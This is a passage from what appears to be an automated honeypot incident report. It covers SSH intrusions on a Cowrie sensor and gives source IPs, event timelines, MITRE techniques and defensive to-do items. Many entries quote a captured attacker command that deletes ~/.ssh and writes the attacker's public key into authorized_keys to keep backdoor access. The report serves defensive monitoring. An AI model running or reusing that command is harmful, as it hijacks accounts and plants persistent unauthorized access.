| `2026-04-10 15:37:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `121.229.27[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f48e712d680

| Field | Detail |
|---|---|
| **Source IP** | `121.229.27[.]155` |
| **First Seen** | 2026-04-10 15:37 |
| **Last Seen** | 2026-04-10 15:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:37:54` | `cowrie.session.connect` |
| `2026-04-10 15:37:54` | `cowrie.client.version` |
| `2026-04-10 15:37:55` | `cowrie.client.kex` |
| `2026-04-10 15:37:56` | `cowrie.login.success` |
| `2026-04-10 15:37:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `121.229.27[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3a112e2e09d

| Field | Detail |
|---|---|
| **Source IP** | `121.229.27[.]155` |
| **First Seen** | 2026-04-10 15:38 |
| **Last Seen** | 2026-04-10 15:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:38:19` | `cowrie.session.connect` |
| `2026-04-10 15:38:19` | `cowrie.client.version` |
| `2026-04-10 15:38:19` | `cowrie.client.kex` |
| `2026-04-10 15:38:21` | `cowrie.login.success` |
| `2026-04-10 15:38:21` | `cowrie.session.params` |
| `2026-04-10 15:38:21` | `cowrie.command.input` |
| `2026-04-10 15:38:21` | `cowrie.command.failed` |
| `2026-04-10 15:38:21` | `cowrie.log.closed` |
| `2026-04-10 15:38:21` | `cowrie.session.params` |
| `2026-04-10 15:38:21` | `cowrie.command.input` |
| `2026-04-10 15:38:21` | `cowrie.session.file_download` |
| `2026-04-10 15:38:21` | `cowrie.log.closed` |
| `2026-04-10 15:38:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `121.229.27[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0c71b61e15b

| Field | Detail |
|---|---|
| **Source IP** | `121.229.27[.]155` |
| **First Seen** | 2026-04-10 15:38 |
| **Last Seen** | 2026-04-10 15:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:38:25` | `cowrie.session.connect` |
| `2026-04-10 15:38:25` | `cowrie.client.version` |
| `2026-04-10 15:38:25` | `cowrie.client.kex` |
| `2026-04-10 15:38:26` | `cowrie.login.success` |
| `2026-04-10 15:38:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `121.229.27[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c47bfbf78d8d

| Field | Detail |
|---|---|
| **Source IP** | `121.229.27[.]155` |
| **First Seen** | 2026-04-10 15:39 |
| **Last Seen** | 2026-04-10 15:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:39:01` | `cowrie.session.connect` |
| `2026-04-10 15:39:01` | `cowrie.client.version` |
| `2026-04-10 15:39:01` | `cowrie.client.kex` |
| `2026-04-10 15:39:02` | `cowrie.login.success` |
| `2026-04-10 15:39:03` | `cowrie.session.params` |
| `2026-04-10 15:39:03` | `cowrie.command.input` |
| `2026-04-10 15:39:03` | `cowrie.command.failed` |
| `2026-04-10 15:39:03` | `cowrie.log.closed` |
| `2026-04-10 15:39:04` | `cowrie.session.params` |
| `2026-04-10 15:39:04` | `cowrie.command.input` |
| `2026-04-10 15:39:04` | `cowrie.session.file_download` |
| `2026-04-10 15:39:04` | `cowrie.log.closed` |
| `2026-04-10 15:39:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `121.229.27[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3999d4f1606b

| Field | Detail |
|---|---|
| **Source IP** | `121.229.27[.]155` |
| **First Seen** | 2026-04-10 15:39 |
| **Last Seen** | 2026-04-10 15:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:39:06` | `cowrie.session.connect` |
| `2026-04-10 15:39:06` | `cowrie.client.version` |
| `2026-04-10 15:39:06` | `cowrie.client.kex` |
| `2026-04-10 15:39:07` | `cowrie.login.success` |
| `2026-04-10 15:39:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `121.229.27[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9098dac44d56

| Field | Detail |
|---|---|
| **Source IP** | `43.156.71[.]43` |
| **First Seen** | 2026-04-10 15:39 |
| **Last Seen** | 2026-04-10 15:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:39:10` | `cowrie.session.connect` |
| `2026-04-10 15:39:10` | `cowrie.client.version` |
| `2026-04-10 15:39:10` | `cowrie.client.kex` |
| `2026-04-10 15:39:11` | `cowrie.login.success` |
| `2026-04-10 15:39:11` | `cowrie.session.params` |
| `2026-04-10 15:39:11` | `cowrie.command.input` |
| `2026-04-10 15:39:11` | `cowrie.command.failed` |
| `2026-04-10 15:39:11` | `cowrie.log.closed` |
| `2026-04-10 15:39:11` | `cowrie.session.params` |
| `2026-04-10 15:39:11` | `cowrie.command.input` |
| `2026-04-10 15:39:11` | `cowrie.session.file_download` |
| `2026-04-10 15:39:11` | `cowrie.log.closed` |
| `2026-04-10 15:39:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.71[.]43` to AbuseIPDB if not already reported
- [ ] Block `43.156.71[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-957e53c2cdcd

| Field | Detail |
|---|---|
| **Source IP** | `43.156.71[.]43` |
| **First Seen** | 2026-04-10 15:39 |
| **Last Seen** | 2026-04-10 15:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:39:13` | `cowrie.session.connect` |
| `2026-04-10 15:39:13` | `cowrie.client.version` |
| `2026-04-10 15:39:13` | `cowrie.client.kex` |
| `2026-04-10 15:39:13` | `cowrie.login.success` |
| `2026-04-10 15:39:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.71[.]43` to AbuseIPDB if not already reported
- [ ] Block `43.156.71[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d983629ee7a1

| Field | Detail |
|---|---|
| **Source IP** | `121.229.27[.]155` |
| **First Seen** | 2026-04-10 15:39 |
| **Last Seen** | 2026-04-10 15:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:39:18` | `cowrie.session.connect` |
| `2026-04-10 15:39:18` | `cowrie.client.version` |
| `2026-04-10 15:39:18` | `cowrie.client.kex` |
| `2026-04-10 15:39:20` | `cowrie.login.success` |
| `2026-04-10 15:39:20` | `cowrie.session.params` |
| `2026-04-10 15:39:20` | `cowrie.command.input` |
| `2026-04-10 15:39:20` | `cowrie.command.failed` |
| `2026-04-10 15:39:20` | `cowrie.log.closed` |
| `2026-04-10 15:39:21` | `cowrie.session.params` |
| `2026-04-10 15:39:21` | `cowrie.command.input` |
| `2026-04-10 15:39:21` | `cowrie.session.file_download` |
| `2026-04-10 15:39:21` | `cowrie.log.closed` |
| `2026-04-10 15:39:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `121.229.27[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25ddc9f1307e

| Field | Detail |
|---|---|
| **Source IP** | `121.229.27[.]155` |
| **First Seen** | 2026-04-10 15:39 |
| **Last Seen** | 2026-04-10 15:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:39:23` | `cowrie.session.connect` |
| `2026-04-10 15:39:23` | `cowrie.client.version` |
| `2026-04-10 15:39:23` | `cowrie.client.kex` |
| `2026-04-10 15:39:24` | `cowrie.login.success` |
| `2026-04-10 15:39:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `121.229.27[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9994cb8a1c01

| Field | Detail |
|---|---|
| **Source IP** | `121.229.27[.]155` |
| **First Seen** | 2026-04-10 15:40 |
| **Last Seen** | 2026-04-10 15:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:40:13` | `cowrie.session.connect` |
| `2026-04-10 15:40:13` | `cowrie.client.version` |
| `2026-04-10 15:40:13` | `cowrie.client.kex` |
| `2026-04-10 15:40:14` | `cowrie.login.success` |
| `2026-04-10 15:40:15` | `cowrie.session.params` |
| `2026-04-10 15:40:15` | `cowrie.command.input` |
| `2026-04-10 15:40:15` | `cowrie.command.failed` |
| `2026-04-10 15:40:15` | `cowrie.log.closed` |
| `2026-04-10 15:40:15` | `cowrie.session.params` |
| `2026-04-10 15:40:15` | `cowrie.command.input` |
| `2026-04-10 15:40:15` | `cowrie.session.file_download` |
| `2026-04-10 15:40:15` | `cowrie.log.closed` |
| `2026-04-10 15:40:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `121.229.27[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a790a793fbb

| Field | Detail |
|---|---|
| **Source IP** | `187.107.88[.]97` |
| **First Seen** | 2026-04-10 15:40 |
| **Last Seen** | 2026-04-10 15:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:40:15` | `cowrie.session.connect` |
| `2026-04-10 15:40:15` | `cowrie.client.version` |
| `2026-04-10 15:40:16` | `cowrie.client.kex` |
| `2026-04-10 15:40:17` | `cowrie.login.success` |
| `2026-04-10 15:40:18` | `cowrie.session.params` |
| `2026-04-10 15:40:18` | `cowrie.command.input` |
| `2026-04-10 15:40:18` | `cowrie.command.failed` |
| `2026-04-10 15:40:18` | `cowrie.log.closed` |
| `2026-04-10 15:40:19` | `cowrie.session.params` |
| `2026-04-10 15:40:19` | `cowrie.command.input` |
| `2026-04-10 15:40:19` | `cowrie.session.file_download` |
| `2026-04-10 15:40:19` | `cowrie.log.closed` |
| `2026-04-10 15:40:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.107.88[.]97` to AbuseIPDB if not already reported
- [ ] Block `187.107.88[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bce821db38a3

| Field | Detail |
|---|---|
| **Source IP** | `121.229.27[.]155` |
| **First Seen** | 2026-04-10 15:40 |
| **Last Seen** | 2026-04-10 15:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:40:18` | `cowrie.session.connect` |
| `2026-04-10 15:40:18` | `cowrie.client.version` |
| `2026-04-10 15:40:18` | `cowrie.client.kex` |
| `2026-04-10 15:40:18` | `cowrie.login.success` |
| `2026-04-10 15:40:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `121.229.27[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc9019fb09b8

| Field | Detail |
|---|---|
| **Source IP** | `187.107.88[.]97` |
| **First Seen** | 2026-04-10 15:40 |
| **Last Seen** | 2026-04-10 15:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:40:23` | `cowrie.session.connect` |
| `2026-04-10 15:40:23` | `cowrie.client.version` |
| `2026-04-10 15:40:23` | `cowrie.client.kex` |
| `2026-04-10 15:40:24` | `cowrie.login.success` |
| `2026-04-10 15:40:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.107.88[.]97` to AbuseIPDB if not already reported
- [ ] Block `187.107.88[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa6b3679d862

| Field | Detail |
|---|---|
| **Source IP** | `14.103.111[.]135` |
| **First Seen** | 2026-04-10 15:41 |
| **Last Seen** | 2026-04-10 15:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:41:15` | `cowrie.session.connect` |
| `2026-04-10 15:41:15` | `cowrie.client.version` |
| `2026-04-10 15:41:15` | `cowrie.client.kex` |
| `2026-04-10 15:41:16` | `cowrie.login.success` |
| `2026-04-10 15:41:16` | `cowrie.session.params` |
| `2026-04-10 15:41:16` | `cowrie.command.input` |
| `2026-04-10 15:41:16` | `cowrie.command.failed` |
| `2026-04-10 15:41:16` | `cowrie.log.closed` |
| `2026-04-10 15:41:17` | `cowrie.session.params` |
| `2026-04-10 15:41:17` | `cowrie.command.input` |
| `2026-04-10 15:41:17` | `cowrie.session.file_download` |
| `2026-04-10 15:41:17` | `cowrie.log.closed` |
| `2026-04-10 15:41:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.111[.]135` to AbuseIPDB if not already reported
- [ ] Block `14.103.111[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bec9f3755ffc

| Field | Detail |
|---|---|
| **Source IP** | `14.103.111[.]135` |
| **First Seen** | 2026-04-10 15:41 |
| **Last Seen** | 2026-04-10 15:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:41:19` | `cowrie.session.connect` |
| `2026-04-10 15:41:19` | `cowrie.client.version` |
| `2026-04-10 15:41:20` | `cowrie.client.kex` |
| `2026-04-10 15:41:20` | `cowrie.login.success` |
| `2026-04-10 15:41:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.111[.]135` to AbuseIPDB if not already reported
- [ ] Block `14.103.111[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc575e772153

| Field | Detail |
|---|---|
| **Source IP** | `187.107.88[.]97` |
| **First Seen** | 2026-04-10 15:47 |
| **Last Seen** | 2026-04-10 15:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:47:01` | `cowrie.session.connect` |
| `2026-04-10 15:47:01` | `cowrie.client.version` |
| `2026-04-10 15:47:01` | `cowrie.client.kex` |
| `2026-04-10 15:47:02` | `cowrie.login.success` |
| `2026-04-10 15:47:03` | `cowrie.session.params` |
| `2026-04-10 15:47:03` | `cowrie.command.input` |
| `2026-04-10 15:47:03` | `cowrie.command.failed` |
| `2026-04-10 15:47:03` | `cowrie.log.closed` |
| `2026-04-10 15:47:04` | `cowrie.session.params` |
| `2026-04-10 15:47:04` | `cowrie.command.input` |
| `2026-04-10 15:47:04` | `cowrie.session.file_download` |
| `2026-04-10 15:47:04` | `cowrie.log.closed` |
| `2026-04-10 15:47:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.107.88[.]97` to AbuseIPDB if not already reported
- [ ] Block `187.107.88[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee4d78a34a6f

| Field | Detail |
|---|---|
| **Source IP** | `187.107.88[.]97` |
| **First Seen** | 2026-04-10 15:47 |
| **Last Seen** | 2026-04-10 15:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:47:08` | `cowrie.session.connect` |
| `2026-04-10 15:47:08` | `cowrie.client.version` |
| `2026-04-10 15:47:08` | `cowrie.client.kex` |
| `2026-04-10 15:47:09` | `cowrie.login.success` |
| `2026-04-10 15:47:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.107.88[.]97` to AbuseIPDB if not already reported
- [ ] Block `187.107.88[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0a5b6b67284

| Field | Detail |
|---|---|
| **Source IP** | `43.156.71[.]43` |
| **First Seen** | 2026-04-10 15:51 |
| **Last Seen** | 2026-04-10 15:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
